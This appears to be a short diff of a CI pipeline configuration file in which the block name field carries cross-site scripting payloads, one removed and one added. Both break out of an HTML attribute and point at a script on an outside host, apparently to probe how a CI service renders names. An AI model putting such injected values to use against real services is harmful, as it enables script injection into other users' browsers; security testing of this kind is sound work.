@@ -5,7 +5,7 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: 'Block #111"><iframe srcdoc=''<script/src="https://insert-script.com/test.js">&lt;/script>''></iframe>'
+  - name: 'Block #111"><div data-poll-href="https://insert-script.com/test.js"></div>'
     task:
       jobs:
         - name: 'Job #1'
